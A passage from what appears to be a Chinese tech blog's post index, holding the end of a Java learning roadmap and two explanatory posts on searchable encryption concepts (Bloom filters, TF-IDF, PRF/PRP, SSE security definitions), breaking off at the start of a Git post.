**必知必会**\n\n- JVM☑️\n- JUC☑️\n\n- 设计模式📌\n\n\n> **学习资源**\n\n- JVM\n  - [尚硅谷宋红康 - JVM全套教程详解](https://www.bilibili.com/video/BV1PJ411n7xZ)\n  - [狂神说Java JVM快速入门篇](https://www.bilibili.com/video/BV1iJ411d7jS)\n  - [阿里云 JVM 实战](https://developer.aliyun.com/graph/java/point/64)\n  - [Java 虚拟机底层原理知识总结](https://github.com/doocs/jvm)\n  - 《深入理解 Java 虚拟机》\n- JUC\n  - [尚硅谷-大厂必备技术之JUC并发编程](https://www.bilibili.com/video/BV1Kw411Z7dF)\n  - 《Java 并发编程艺术》\n  - 《Java 并发编程之美》\n- 设计模式\n  - 《图解设计模式》\n  - 《设计模式的艺术》\n\n## CS基础\n\n> **必知必会**\n\n- 计算机网络🔄\n- 操作系统🔄\n- 计算机组成原理🔄\n- 数据结构与算法📌\n\n\n> **学习资源**\n\n- 《图解 HTTP》\n- 《图解 TCP/IP》\n- [Java数据结构与算法](https://www.bilibili.com/video/BV1E4411H73v)\n- [代码随想录](https://programmercarl.com/)\n\n## 工具\n\n> **必知必会**\n\n- Maven✅\n- Git✅\n- Docker✅\n- Junit✅\n- Lombok✅\n- Jmeter✅\n- K8S☑️\n- Swagger ☑️\n- Postman ☑️\n\n> **学习资源**\n\n- [腾讯云动手实验室](https://cloud.tencent.com/developer/search/lab-Docker)\n- [Docker 从入门到实践]( https://vuepress.mirror.docker-practice.com/)\n\n## 练手项目\n\n- 电商系统：[mall](https://github.com/macrozheng/mall)\n\n- 秒杀系统：[miaosha](https://github.com/qiurunze123/miaosha)\n- [尚硅谷_谷粒学苑](https://www.bilibili.com/video/BV1dQ4y1A75e)\n\n## 求职相关\n\n### 八股文\n\n- [JavaGuide](https://javaguide.cn/)\n- [Java 全栈知识体系](https://pdai.tech/)\n- [Java 程序员进阶之路](https://tobebetterjavaer.com/)\n- [CS-Wiki](https://cswiki.top/)\n- [程序员大彬 (topjavaer.cn)](http://topjavaer.cn/)\n- [Java后端面试题大全](https://www.developers.pub/wiki/1002310)\n- [javapub.net.cn](http://javapub.net.cn/)\n\n### 求职必读\n\n- [互联网校招指北 ](https://mp.weixin.qq.com/s/Olg_RjmSm1UCuRwwqEJa8g)\n- [为了解开互联网大厂秋招内幕，我把他们全面了一遍](https://mp.weixin.qq.com/s/pBsGQNxvRupZeWt4qZReIA)\n- [Overseas Rabbit | 海外兔 (osjobs.net)](https://osjobs.net/)\n\n### 岗位投递\n\n- 阿里：https://talent.alibaba.com/\n- 腾讯：https://join.qq.com/index.html\n- 美团：https://campus.meituan.com/\n- 华为：https://career.huawei.com/\n- 京东：https://campus.jd.com/home#/\n- 百度：https://talent.baidu.com/external/baidu/\n- 滴滴：https://talent.didiglobal.com/\n- 网易：https://campus.163.com/app/index\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["路线"],"categories":["JavaSE"]},{"title":"可搜索加密：基础知识","url":"/posts/1428.html","content":"\n### 1.局部敏感哈希(LSH)\n\n**Locality Sensitive Hashing**：`主要用于高效处理海量高维数据的最近邻问题` ，使得 2 个相似度很高的数据以较高的概率映射成同一个hash 值，而令 2 个相似度很低的数据以极低的概率映射成同一个 hash 值。\n\nLSH详细内容请看：[LSH原理与实现](https://blog.csdn.net/guoziqing506/article/details/53019049)、[LSH(局部敏感哈希)](http://staff.ustc.edu.cn/~huding/data_pdf/LSH.pdf)、[深入浅出LSH](http://www.cppblog.com/humanchao/archive/2018/02/24/215521.html)\n\n[Locality Sensitive Hashing (LSH) Home Page (mit.edu)](https://www.mit.edu/~andoni/LSH/)\n\n[一文了解局部敏感哈希（LSH）的前世今生](https://blog.csdn.net/m0_37710845/article/details/106725631)\n\n### 2.布隆过滤器(BF)\n\n**Bloom filter**：`主要用于检索一个元素是否在一个集合中`，1970年由布隆提出，它实际上是一个很长的二进制向量(位图)和一系列随机映射函数（哈希函数）。存储的数据是 0 或 1 ，默认是0，0代表`不存在`某个数据，1代表`存在`某个数据。\n\n![](../images/可搜索加密：基础知识/640)\n\n##### 存入过程\n\n布隆过滤器上面说了，就是一个二进制数据的集合。当一个数据加入这个集合时，经历如下洗礼：\n\n- 通过 K 个哈希函数计算该数据，返回 K 个计算出的 hash 值\n- 这 K 个 hash 值映射到对应的 K 个二进制的数组下标\n- 将 K 个下标对应的二进制数据改成 1 。\n\n例如，将“你好”存入布隆过滤器，第一个哈希函数返回 3，第二个第三个哈希函数返回 5 与 7 ，那么布隆过滤器对应的下标3，5，7的位置改成1。\n\n![](../images/可搜索加密：基础知识/640-20220125184517663)\n\n##### 查询过程\n\n布隆过滤器主要作用就是查询一个数据，在不在这个二进制的集合中，查询过程如下：\n\n- 通过 K 个哈希函数计算该数据，对应计算出的 K 个 hash 值\n- 通过 hash 值找到对应的二进制的数组下标\n- 判断：如果存在一处位置的二进制数据是 0，那么该数据不存在。如果都是1，该数据存在集合中。\n\n我们假设 BF 是一个 12bit 的二进制向量，{h1,h2}是两个哈希函数，{x,y,z}是一个集合。 用户想查询关键字 w,查询结果显示 w 在集合中不存在。\n\n![](../images/可搜索加密：基础知识/image-20220126235419137.png)\n\n##### 优缺点\n\n它的优点是空间效率和查询时间都远远超过一般的算法，缺点是有一定的**误识别率**和**删除困难**。\n\n添加数据是通过计算数据的 hash 值，那么很有可能存在这种情况：两个不同的数据计算得到相同的 hash值。这样查询的时候就会造成错误识别，同样如果已经存在有两个相同 hash 值的数据，删除时就会同时删除两个。\n\nBF详细内容请看：[最牛一篇布隆过滤器详解](https://mp.weixin.qq.com/s/1AbsMXNvTcZ_baKES8K4Kg)\n\n##### Bloom filter 假阳性\n\n- Bloom filter 存在假阳性（false positive）的可能\n  - 假阳性表示实际是假但误辨为真的情况\n\n- Bloom filter 不存在假阴性（false negatives）的可能\n  - 假阴性表示实际是真但误辨为假的情况\n\n也就是说，一次查询返回的结果是**可能在集合里**或者**绝对不在集合里**。\n\n------\n\n### 3.对偶编码函数\n\n给定字符串 S<sub>1</sub> = C<sub>1</sub>C<sub>2</sub> … C<sub>n</sub> 和二进制向量 S<sub>2</sub> = b<sub>0</sub>b<sub>1</sub> … b<sub>m-1</sub> , S<sub>2</sub> 中每位元素的初始值为 0，其中 n < m .通过 Hash 函数 H，把 S<sub>1</sub> 中相邻 2 个字符散列映射为 0～(m -1) 之间的数，当且仅当 H ( C<sub>j</sub> , C<sub>j +1</sub> ) = i 时，b<sub>i</sub> = 1。把 S<sub>1</sub> → S<sub>2</sub> 的函数称为对偶编码函数。\n\n在面向密文的多关键字模糊搜索方案中，构建索引、构建陷门和关键字查询的过程都是基于向量的操作过程。数据拥有者输入的关键字都由字符组成，由于字符的不可计算性，需要将其转换成向量的形式。\n\n------\n\n### 4.倒排索引\n\n**正排索引(forward index)**\n\n正排索引是指以文档 ID 为 Key，文档内容为 Value\n\n**倒排索引(inverted index)**\n\n倒排索引是指以文档内容为 Key，文档 ID 为 Value\n\n**举个例子🌰**\n\n例如，有 3 个文档及其对应关键词\n\n| ID   | 文档     | 关键词     |\n| ---- | :------- | ---------- |\n| id1  | 《手机》 | 苹果、小米 |\n| id2  | 《水果》 | 香蕉、苹果 |\n| id3  | 《粮食》 | 小米、玉米 |\n\n正排索引：\n\n**{id1，苹果，小米}、{id2，香蕉，苹果}、{id3，小米，玉米}**\n\n倒排索引：\n\n**{苹果，id1，id2}、{小米，id1，id3}、{香蕉，id2}、{玉米，id3}**\n\n**两种索引优缺点**\n\n| 索引     | 优点             | 缺点                   |\n| -------- | ---------------- | ---------------------- |\n| 正排索引 | 易维护、构建方便 | 搜索耗时长             |\n| 倒排索引 | 搜索耗时短       | 构建耗时、维护成本较高 |\n\n### 5.安全最近邻算法(kNN)\n\nKNN(k-nearest neighbour)：就是 K 个最近的邻居的意思，说的是每个样本都可以用它最接近的 K 个邻近值来代表\n\n安全K最近邻计算是 Wong 等人在2009年论文 [Secure kNN computation on encrypted databases ](https://dl.acm.org/doi/pdf/10.1145/1559845.1559862?casa_token=SaRwoUNONpYAAAAA:yyggGhme_SdB5ChSC72vL3JT18SFp8NYfkOCsZJHIIR4eaRWLjTA-tgXMYrqKwLFIPheBAkRvHKV)提出的，用于计算两个加密数据库记录之间的距离。在一个安全的 KNN 计算中，所有的数据库记录都被扩展到 m 维的向量，并由 m位的向量 S 和两个 m × m 可逆矩阵 M1 和 M2 加密。\n\n**举个🌰**\n\n下图中，绿色圆要被决定赋予哪个类，是红色三角形还是蓝色四方形？\nKNN的算法过程是是这样的：\n\n![](../images/可搜索加密：基础知识/webp-4501084.)\n\n- 最小的圈K=3，第二个圈K=5\n- 如果K=3，那么离绿色点最近的有2个红色三角形和1个蓝色的正方形，这3个点投票，于是绿色的这个待分类点属于红色的三角形。\n- 如果K=5，那么离绿色点最近的有2个红色三角形和3个蓝色的正方形，这5个点投票，于是绿色的这个待分类点属于蓝色的正方形。\n\n------\n\n### 6.词频-逆文档频度(TF-IDF)\n\n词频-逆文档频度（Term Frequency - Inverse Document Frequency）是一种用于**信息检索**与**文本挖掘**的常用**加权技术**，用来**评估一个词对于一个文档集或语料库中某个文档的重要程度**，主要用在**自动提取关键词算法**中。\n\n##### **词频 (TF)**\n\n指的是某一个给定的词语在该文件中出现的次数。\n\n![](../images/可搜索加密：基础知识/webp)\n\n##### 逆文档频率(IDF)\n\n> 以统计一篇文档的关键词为例，最简单的方法就是计算每个词的词频，出现频率最高的词就是这篇文档的关键词，但是一篇文章中出现频率最高的词肯定是“的”、“是”、“在”……这样的词，这些词显然不能反应文章的意思，此时就需要对每个词加一个权重，最常见的词（\"的\"、\"是\"、\"在\"）给予最小的权重，较少见的但能反应这篇文章意思的词给予较大的权重，这个权重叫做**逆文档频率**。\n\nIDF 是一个词语普遍重要性的度量。如果一个词越常见，那么分母就越大，逆文档频率就越小越接近0。分母之所以要加1，是为了避免分母为0（即所有文档都不包含该词）。\n\n![](../images/可搜索加密：基础知识/webp-20220126224442893)\n\n##### TF-IDF\n\n知道了 TF 和 IDF 以后，将这两个值相乘，就得到了一个词的 TF-IDF 值。某个词对文章的重要性越高，它的 TF-IDF 值就越大。所以，排在最前面的几个词，就是这篇文章的关键词。\n\n![](../images/可搜索加密：基础知识/bg2013031507.png)\n\n可以看到，TF-IDF 与一个词在文档中的出现次数成正比，与该词在整个语言中的出现次数成反比。所以，自动提取关键词的算法就很清楚了，就是计算出文档的每个词的 TF-IDF 值，然后按降序排列，取排在最前面的几个词。\n\n##### 总结\n\n字词的重要性随着它在文件中出现的次数成正比增加 ，但同时会随着它在语料库中出现的频率成反比下降 。如果某个词比较少见，但是它在这篇文章中多次出现，那么它很可能就反映了这篇文章的特性，正是我们所需要的关键词。\n\nTF-IDF详细内容请看：[TF-IDF（词频-逆文档频率）介绍](https://www.jianshu.com/p/b2c4ee414fac)\n\n------\n\n### 7.波特词干算法(Porter stem)\n\n从数据集中提取出的关键字集合进行“词根” 过滤，例如“walks”、“walking”、“walked”等近似的关键字，词根均为“walk”。后续的检索操作基于词根进行，大幅减少了计算量，且由于该操作只是在索引生成时执行一次，对整个系统的运行效率不会产生过大的影响。\n\n### 8.分词算法(N-gram)\n\nN-gram 模型是一种语言模型（Language Model，LM），N-gram 的基本思想是将文本里面的内容按照字节进行大小为 N 的滑动窗口操作，形成了长度是 N 的字节片段序列。每个字节片段即为 gram 。\n\n- 当N=1 时称为 `uni-gram` \n- 当N=2 时称为 `bi-gram` \n  - P(我帮你) = P(我) * P(帮|我) * P(你|帮)\n  - {\"我帮\":1, \"帮你\":2, \"你帮\":3, \"帮我\":4}\n  - 我帮你→[1,1,0,0]\n  - 你帮我→[0,0,1,1]\n- 当N=3 时称为 `tri-gram` \n\n例如输入为西安交通大学\n\n- uni-gram 形式为：西/安/交/通/大/学\n\n- big-ram形式为： 西安/安交/交通/通大/大学\n\n- tri-gram形式为：西安交/安交通/交通大/通大学\n\n中文文本处理大多采用 bi-gram 进行分解，因为双字词出现概率比较大，即以大小为2的滑动窗口进行操作，切成长度为 2 的字节片段。\n\n------\n\n### 9.Top-k检索\n\n旨在获取相似度后，将其作为打分结果，根据匹配到的文件的分数，按照顺序返回给用户分数排名最高的K份数据，是搜索引擎中最常见的模式。简而言之，就是使用户快速找到最相关的 k 个结果。\n\n### 10.向量内积(点乘)\n\n- a = [a1,a2,...,an]\n- b = [b1,b2,...bn]\n\na 和 b 的内积公式为：a∙b = a1b1 + a2b2 + ... + anbn\n\n**内积的几何意义**\n\n内积的几何意义是可以用来表征或计算两个向量之间的夹角，以及在 b 向量在 a 向量方向上的投影。\n\n### 11.PRF&PRP\n\n> 伪随机函数（PRF）和置换（PRP），它们是多项式时间可计算的函数，不能被任何可能的多项式时间对手从随机函数中区分出来。\n\nPRP（pseudo random permutation，伪随机置换）和PRF（pseudo random function，伪随机函数）之间的区别，可以从定义来看\n\n**PRF**\n\n- F：K × X → Y\n\n取一个密钥和集合 X 中的元素作为输入，输出值在集合 Y 中，现在唯一要求的是存在一个有效的算法来实现这个函数。也就是说，要有一个有效的函数来实现 **K × X → Y** 的映射。\n\n**PRP**\n\n- E：K × X → X\n- 存在求解 E(K,X) 的高效确定性算法\n- 函数 E(k,·) 是一对一的\n- 存在高效的“逆算法” D(K,X)\n\n与 PRF 不同的是，多了一个条件，那就是要有一个算法 D 可以实现逆运算。\n\n在PRP中，存在一个有效算法，能够实现 **K × X → X** 映射关系，也就是说该算法能够将随机密钥 K 与集合 X 中的元素作为输入，同时输出值也是集合 X 中的元素，那么就要求每个元素一一对应。从本质上来说，E(K,X) 是对元素 x 的置换，为了解密的需要，就要求 E 是可逆的。\n\n### 12.Homomorphic MAC\n\n同态MAC：任何消息 m<sub>i</sub> 被加密为一个 degree-1 多项式 y(x)\n\n- 即 y(0) = m<sub>i</sub> 和 y(α) = γ<sub>i</sub>，其中 α 和 γ<sub>i</sub> 只有验证者知道\n- 即 y(x) = m<sub>i</sub> + ( γ<sub>i</sub> −m<sub>i</sub>)∙x/α 成立。\n- 由于云服务器在计算函数 f 时需要进行一些基本的算术运算，因此需要引入同态加密，对加密后的数据进行直接计算。\n  - f(γ<sub>1</sub>,···, γ<sub>n</sub>) = y(α)    ---①\n  - f(m<sub>1</sub> ,···, m<sub>n</sub>) = y(0) ---②\n- 在方程①建立的条件下，验证器可以验证方程②。因此，该技术可以验证云服务器是否诚实地执行用户定义的搜索算法\n\n由于传统同态 MAC 仅支持有限域的计算，论文 VRFMS 采用了 realhomm-MAC，realhomm-MAC 的改进是将所有消息作为实数来处理，其编码格式类似于 IEEE 754 标准中定义的双精度浮点格式。也就是说，新算法在保留原算法同态的前提下能够处理实数。\n\n### 13.SSE安全性\n\nKPA<IND-SCKA<IND-CKA<IND-CKA2\n\n**KPA**\n\n- Known Plaintext Attack\n\n- 知道部分的明文和密文对，推出密钥和加密算法\n\n![](../images/可搜索加密：基础知识/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0EzMzI4MDAwMGY=,size_16,color_FFFFFF,t_70.png)\n\n**SCKA**\n\n- selectivelychosen-keyword attack\n\n- 选择性关键字攻击\n\n- 它不能保证谓词的私密性，因为攻击者可以通过生成任意的明文-密文索引对 从陷门中推断出查询关键字。\n\n**IND-CKA1** \n\n- indistinguishability against chosen keyword attack\n- 针对选择关键字攻击的不可区分性\n- 保证文档内容不会被建立在其上的索引以及其他文档的索引泄漏\n\nIND-CKA2\n\n- adaptively chosen-keyword attack\n- 自适应选择关键字攻击\n- 自适应攻击模型下满足抵抗选择性明文攻击的安全为CKA2\n\n- 对手根据先前选择的查询及其陷门和搜索结果自适应地选择未来的每个查询。如果没有概率多项式时间（PPT）对手能够以不可忽略的优势区分真实项目和模拟项目，则该方案是自适应安全的，这是迄今为止基于SSE的关键字搜索最强大的安全模型。\n\n参考：在 [可搜索的对称加密：改进的定义和有效的构造](https://dl.acm.org/doi/abs/10.1145/1180405.1180417?casa_token=9_Hd9p-Sz3sAAAAA:exvY5ztMhWxLalHYBWhqHRZ_Rf54MMJf17PV5mgJMnGNDWtQNBlPD6jP34jUEyojdSFXAer7F23u) 中，Curtmola 等人。为可搜索的加密方案提出非自适应和自适应（不可区分性和基于模拟器）的安全定义，通常称为IND-CKA1 和IND-CKA2。\n\n### 14.双线性映射\n\n> 1946年双线性对首先被法国数学家Weil提出并成为代数几何领域重要的概念和研究工具。\n\n双线性映射可以用五元组 (p,G1,G2,GT,e) 来描述，G1，G2，GT 是三个素数阶乘法循环群，阶数皆为p，定义在这三个群上的一个映射关系e：G1*G2 —>GT，满足以下性质： \n\n1、双线性性：对于任意a，b ∈ Z<sub>p</sub> 和 R，S ∈ G<sub>1</sub>，有e(R<sup>a</sup>, S<sup>b</sup>) = e(R, S)<sup>ab</sup>；\n\n2、非退化性：存在R，S ∈  G<sub>1</sub>，使得 e(R, S) ≠ 1<sub>G<sub>2</sub></sub>（1<sub>G<sub>2</sub></sub>代表G<Sub>2</sub>群的单位元）；\n\n3、可计算性：存在有效的算法对任意的 R，S ∈  G<sub>1</sub>，计算e(R, S)的值。\n\n如果G1=G2则称上述双线性配对是对称的，否则是非对称的。\n\n\n\n[双线性对在密码学中的应用（上）](https://mp.weixin.qq.com/s?__biz=Mzg2MDA2NzQwNw==&mid=2247483915&idx=1&sn=eaa67a4332c97d7c66906825ec5a0907&chksm=ce2d412bf95ac83dd2900defe103e654e39ee1fabf2655303cd1b724d7fb0bed0e5a10a74e25&scene=21#wechat_redirect)\n\n[双线性对在密码学中的应用（下）](https://mp.weixin.qq.com/s?__biz=Mzg2MDA2NzQwNw==&mid=2247483942&idx=1&sn=22a33eee26f8eb24a03b5ce394afe714&chksm=ce2d4106f95ac8101f921eef1e9140c66a574f0d438d5c54b7d4f886b7f13961532505a0c6c2&cur_album_id=1603503752706080773&scene=189#wechat_redirect)\n\n\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["可搜索加密"],"categories":["Crypto"]},{"title":"可搜索加密：前世今生","url":"/posts/41049.html","content":"\n本篇文章以小简看过的文献以及查阅的资料为基础，归纳和总结了**可搜索加密**(Searchable Encryption，SE)的相关知识点。\n\n## SE介绍\n\n> 以下内容是小简阅读可搜索加密的两篇综述论文所总结，论文介绍如下\n\n| 序号 | 论文名称                                          | 作者  <br/>年份    | 单位         | 来源                                         | 链接                                                         |\n| ---- | ------------------------------------------------- | ------------------ | ------------ | -------------------------------------------- | ------------------------------------------------------------ |\n| 1    | Survey on the Searchable Encryption               | 李经纬        2015 | 南开大学     | Journal of Software                          | [原文](http://www.jos.org.cn/html/2015/1/4700.htm#outline_anchor_3) |\n| 2    | Research Advances on Secure Searchable Encryption | 董晓蕾  2017       | 华东师范大学 | Journal of Computer Research and Development | [原文](https://crad.ict.ac.cn/CN/10.7544/issn1000-1239.2017.20170627) |\n\n**可搜索加密**(SE)：旨在将数据文件进行加密后存储到云端，然后对密文进行检索的一种技术。\n\n例如：用户为节约自身的资源开销，将文件外包给云服务器，但又不想云服务知道存储的文件内容，因此需要对文件采用某种加密方式加密后存储。此外，用户若想从云服务器中查询文件中的特定数据，只有合法的用户基于关键词检索对应的密文数据。\n\n**可搜索加密解决两类基本问题：**\n\n- ① 不可信赖服务器的存储问题\n\n- ② 不可信赖服务器的路由问题\n\n## SE过程\n\n- **①加密过程**。用户使用密钥在本地对明文文件进行加密，并将其上传至服务器。\n\n- **②陷门生成过程**。具备检索能力的用户，使用密钥生成待查询关键词的陷门，要求陷门不能泄露关键词的任何信息。\n\n- **③检索过程**。服务器以关键词陷门为输入，执行检索算法，返回所有包含该陷门对应关键词的密文文件，要求服务器除了能知道密文文件是否包含某个特定关键词外，无法获得更多信息。\n\n- **④解密过程**。用户使用密钥解密服务器返回的密文文件，获得查询结果。\n\n![可搜索加密过程](https://img.jwt1399.top/img/4700-1.jpg)\n\n## SE分类\n\n### 按照应用模型分类\n\n- **①一对一模式**\n  - 用户加密个人文件并将其存储到不可信的服务器。只有该用户具备基于关键词检索的能力，服务器无法获取明文文件和待检索关键词的信息。\n  - ![](https://img.jwt1399.top/img/image-20220118220209026.png)\n- **②多对一模式**\n  - 多个发送者加密文件后，将其上传至不可信的服务器，以达到与单个接收者传送数据的目的。只有接收者具备基于关键词检索的能力，服务器无法获取明文文件信息，不同于单用户模型，多对一模式要求发送者和接收者不能是同一用户。\n  - ![](https://img.jwt1399.top/img/image-20220118220352910.png)\n- **③一对多模式**\n  - 单个发送者将加密文件上传至不可信服务器，然后多个接收者共享数据。\n  - ![](https://img.jwt1399.top/img/image-20220118220412515.png)\n- **④多对多模式**\n  - 在多对一模式的基础上，任意用户都可成为接受者，通过访问控制和认证策略后，具备关键词的密文检索方式提取共享文件的能力。只有合法的用户具备基于关键词检索的能力，服务器无法获取明文文件信息，具备广阔的应用前景。\n  - ![](https://img.jwt1399.top/img/image-20220118220425565.png)\n\n### 按照解决策略分类\n\n- **①对称可搜索加密**(Symmetric searchable encryption, SSE)\n  - 旨在加解密过程中采用相同的密钥之外，陷门生成也需要密钥的参与，通常适用于单用户模型，具有计算开销小、算法简单、速度快的特点。\n- **②非对称可搜索加密**(Asymmetric searchable encryption, ASE)\n  - 旨在加解密过程中采用公钥对明文信息加密和目标密文的检索，私钥用于解密密文信息和生成关键词陷门。非对称可搜索加密算法通常较为复杂，加解密速度较慢，其公私钥相互分离的特点，非常适用于私钥生成待检索关键词陷门，通常适用于多对一模型。\n- **③对称+非对称可搜索加密**\n  - 由于非对称SE本身支持最基本形式的隐私数据共享，可通过共享密钥拓展到多对多的应用场景。对称SE虽然使用单用户模型，但计算开销小、速度快，更适用于大型文件数据的加密和共享。通过混合加密与基于属性加密技术相结合，或与代理重加密结合，也可构造共享方案。\n- **④属性基加密**(Attribute-based encryption, ABE)\n  - 它是指通过对用户私钥设置属性集(或访问结构）为数据密文设置访问结构（或属性集），由属性集和访问结构之间的匹配关系确定其解密能力。特别是密文策略的属性基加密（CP-ABE），其密文上的访问策略本身就是一种搜索策略，访问策略的表达能力从一定程度上反映了可搜索能力。\n\n### 按照关键词数分类\n\n- **①单关键词搜索**：旨在用户在检索的过程中使用单关键词进行检索。\n- **②多关键词搜索**：旨在用户在检索的过程中使用多个关键词进行检索。\n\n### 按照检索精度分类\n\n- **①精确搜索**：旨在搜索的过程中，只有当输入的关键词完全等于文件的索引值时才能检索出结果。\n- **②模糊搜索**：旨在搜索的过程中，用户输入的关键词与数据或索引中存在的关键词之间存在某种模糊的关系，并以这种模糊关系进行关键词匹配。模糊搜索分为以下两种架构：\n  - 使用编辑距离(edit distance)：利用通配符和编辑距离构造一组与原始关键字相似的模糊关键字。`不支持多关键字排序搜索、搜索效率低`\n  - 使用局部敏感哈希(LSH)和布隆过滤器(BF)：通过LSH为每个文件生成Bloom过滤器。`搜索精度最多87%`\n\n## SE用途\n\n- ①外包数据库字段加密\n- ②云计算中隐私数据的保护和共享\n- ③密文直接操作的相关应用\n\n## SE构造\n\n- **基于索引**：对于每一个关键字 W，建立一个索引，索引中包含所有含有该关键字的文件的指针。由于这种方案在更新数据的时候会对索引进行大量的修改，因此适合大量只读模式。\n  - Z-IDX方案\n  \n  - SSE-1方案\n- **基于存储结构**：这种情况下没有索引，每次查询都是对文件进行一次扫描来寻找符合查询条件的文件。无疑，这种模式的查询效率会低很多，但是却更适合经常更新的存储系统。\n  - SWP方案\n\n## SE历史\n\n- 2000年——D.Song等人**首次提出了SE**，有效地解决了对加密数据的搜索问题，保证了数据\n  的隐私不被泄露。[论文链接](http://ieeexplore.ieee.org/abstract/document/848445/)\n- 2010年——Jin Li等人提出了**第一个支持模糊关键词搜索**的解决方案。该方案使用编辑距离来表示关键字的相关性，并利用通配符*来构造模糊关键字集。[论文链接](https://ieeexplore.ieee.org/abstract/document/5462196)\n- 2012年——Qi Chai等人**首次提出了**采用**基于树的索引和哈希链技术**实现了**可验证的SE方案**。[论文链接](https://ieeexplore.ieee.org/document/6364125)\n- 2014年——Bing Wang等人提出了**利用LSH和BF的体系结构**提出了MFSE(加密数据上的多关键字模糊搜索)方案。该方案可以在不预先定义模糊关键字集的情况下对返回的结果进行排序。[论文链接](https://ieeexplore.ieee.org/document/6848153)\n- 。。。。。。\n\n## SE未来\n\n未来的工作还应该关注如何应用SE的基本思想来处理其他类型的数据。\n\n例如：\n\n- 如何搜索包含图像数据或视频数据的加密媒体数据；\n- 如何搜索包含关系数据库或非关系数据库的加密数据库；\n- 如何搜索结构化的社交网络数据（空间数据）。\n\n\n\n## SSE安全性\n\n当SSE方案是安全的：\n\n（1）仅密文不揭示关于数据的任何信息；\n\n（2）密文与搜索令牌一起最多揭示了搜索的结果；\n\n（3）只能使用密钥生成搜索令牌。\n\n服务器可以了解到一些关于客户端查询的有限信息。例如它知道正在搜索的关键字都包含在加密为$c_{w}$ 的文件中。\n\n> KPA < IND-SCKA < IND-CKA1 < IND-CKA2\n\n**KPA**\n\n- Known Plaintext Attack\n\n- 知道部分的明文和密文对，推出密钥和加密算法\n\n**SCKA**\n\n- selectivelychosen-keyword attack\n\n- 选择性关键字攻击\n\n- 它不能保证谓词的私密性，因为攻击者可以通过生成任意的明文-密文索引对 从陷门中推断出查询关键字。\n\n**IND-CKA1** \n\n- indistinguishability against chosen keyword attack\n- 针对选择关键字攻击的不可区分性\n- 保证文档内容不会被建立在其上的索引以及其他文档的索引泄漏\n- 然而，在[可搜索的对称加密：改进的定义和高效的结构](https://dl.acm.org/doi/abs/10.5555/2590701.2590705)中提出到，只有当搜索查询独立于 $(\\gamma, c)$ 和先前的搜索结果时，CKA1 才提供安全性。为了解决这个问题，提出了更强的**CKA2**。\n- 只有当客户的查询独立于索引和先前的结果时，CKA1才能保证安全性。\n\nIND-CKA2\n\n- adaptively chosen-keyword attack\n- 自适应选择关键字攻击\n- 自适应攻击模型下满足抵抗选择性明文攻击的安全为CKA2\n\n- 对手根据先前选择的查询及其陷门和搜索结果自适应地选择未来的每个查询。如果没有概率多项式时间（PPT）对手能够以不可忽略的优势区分真实项目和模拟项目，则该方案是自适应安全的，这是迄今为止基于SSE的关键字搜索最强大的安全模型。\n\n- 即使客户端的查询是基于加密的索引和先前查询的结果，CKA2也能保证安全性。\n\nUC-Secure\n\n- 最近，Kurosawa和Ohtaki提出了更强的通用可组合[How to Construct UC-Secure Searchable Symmetric Encryption Scheme](https://eprint.iacr.org/2015/251)（UC-Secure）SSE概念。粗略地说，即使在任意环境中使用该方案时，也能保证安全性。\n\n\n\n参考：在 [可搜索的对称加密：改进的定义和有效的构造](https://dl.acm.org/doi/abs/10.1145/1180405.1180417?casa_token=9_Hd9p-Sz3sAAAAA:exvY5ztMhWxLalHYBWhqHRZ_Rf54MMJf17PV5mgJMnGNDWtQNBlPD6jP34jUEyojdSFXAer7F23u) 中，Curtmola 等人。为可搜索的加密方案提出非自适应和自适应（不可区分性和基于模拟器）的安全定义，通常称为IND-CKA1 和IND-CKA2。\n\n\n\n今年来关于对称可搜搜加密的研究主要集中于对于动态可搜索加密中的前向安全和后向安全。\n\n前向安全指的是：在插入新的文件后，之前的搜索不能匹配到新添加的文件。\n\n后向安全指的是：插入在删除文件后，搜索不会暴漏该文件的标识。\n\n\n\n 前向隐私（Forward privacy）和后向隐私(Backward privacy)是DSSE（Dynamic Searchable Symmetric Encryption）的两个基本属性，旨在控制动态方案中更新操作造成的信息泄露。\n\n前向隐私：服务器无法将当前添加的关键字与之前搜索的结果相关联。即服务器不知道当前添加的关键字是否之前搜索过。（先搜索后更新）。\n\n后向隐私：服务器无法将当前搜索的关键字与之前的更新相关联。即服务器不知道更新（添加或删除）历史（先更新后搜索）。\n\n\n\n\n\n\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果你觉得本文对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["可搜索加密"],"categories":["Crypto"]},{"title":"版本管理-Git","url":"/posts/3232.html","content":"\n一直只会常用的那几个 Git 命令，每次遇到不会的操作都是现去Google，十分不方便，今个得空咋就仔仔细细的学习学习 Git ！\n\n## Git简介\n\n> 